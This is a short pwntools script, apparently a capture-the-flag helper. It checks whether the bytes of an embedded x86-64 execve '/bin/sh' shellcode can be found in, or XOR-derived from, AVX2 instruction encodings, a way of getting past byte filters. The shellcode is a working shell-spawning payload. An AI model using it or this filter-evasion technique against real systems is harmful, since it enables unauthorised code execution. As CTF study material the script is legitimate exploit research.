from pwn import *
from itertools import product

context.arch = 'amd64'
context.os = 'linux'

# === Target shellcode ===
target_shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
shellcode_bytes = set(target_shellcode)

# === AVX2 instruction set ===
avx2_instructions = [
    "vpaddb ymm0, ymm1, ymm2",
    "vpaddd ymm3, ymm4, ymm5",
    "vpsubb ymm1, ymm2, ymm3",
    "vpxor ymm4, ymm4, ymm4",
    "vpand ymm0, ymm1, ymm2",
    "vpor ymm0, ymm1, ymm2",
    "vpmaxub ymm6, ymm6, ymm6",
    "vpslld ymm1, ymm1, 2",
    "vpsrld ymm2, ymm2, 3",
    "vpcmpeqb ymm0, ymm1, ymm2",
    "vpbroadcastb ymm1, xmm0",
    "vpbroadcastd ymm2, xmm1",
    "vperm2i128 ymm1, ymm2, ymm3, 0x31",
    "vextracti128 xmm0, ymm1, 1",
    "vpminub ymm0, ymm1, ymm2",
    "vpsllvd ymm1, ymm2, ymm3",
    "vpsrlvd ymm4, ymm5, ymm6",
    "vpmulld ymm6, ymm7, ymm8",
    "vpand ymm12, ymm13, ymm14",
    "vpor ymm15, ymm0, ymm1",
    "vpcmpeqb ymm1, ymm2, ymm3",
    "vpslld ymm4, ymm5, 4",
    "vpsrld ymm6, ymm7, 2",
    "vpbroadcastb ymm0, xmm1",
    "vpbroadcastd ymm2, xmm3",
    "vperm2i128 ymm4, ymm5, ymm6, 0x31",
    "vextracti128 xmm7, ymm8, 1",
    "vinserti128 ymm9, ymm10, xmm11, 1",
    "vpaddb ymm0, ymm1, ymm2",
    "vpand ymm0, ymm1, ymm2",
    "vpxor ymm4, ymm4, ymm4",
    "vpbroadcastb ymm1, xmm0",
    "vextracti128 xmm0, ymm1, 1"
]

unique_bytes = set()

print("[*] Dumping AVX2 instruction encodings...\n")

for inst in avx2_instructions:
    try:
        encoding = asm(inst)
        unique_bytes.update(encoding)
        print(f"{inst:<60} => {' '.join(f'{b:02x}' for b in encoding)}")
    except Exception as e:
        print(f"[-] Could not assemble: {inst} ({e})")

# === Print summary ===
print("\n[*] Unique bytes used across AVX2 instructions:")
print(" ".join(f"{b:02x}" for b in sorted(unique_bytes)))

print("\n[*] Bytes in your shellcode:")
print(" ".join(f"{b:02x}" for b in target_shellcode))

matched = shellcode_bytes & unique_bytes
print(f"\n[+] Directly matched bytes from AVX2 encoding:")
print(" ".join(f"{b:02x}" for b in sorted(matched)))

# === XOR analysis ===
print("\n[*] Checking XOR derivability...")
xor_map = {}
for a, b in product(unique_bytes, repeat=2):
    x = a ^ b
    if x in shellcode_bytes:
        xor_map.setdefault(x, []).append((a, b))

for b in target_shellcode:
    if b in xor_map:
        print(f"  0x{b:02x} = ", end="")
        for a, c in xor_map[b]:
            print(f"0x{a:02x} ^ 0x{c:02x}", end="  ")
        print()
    else:
        print(f"  0x{b:02x} ❌ Not XOR derivable from AVX2 instruction bytes")

print("\n[*] Done.")
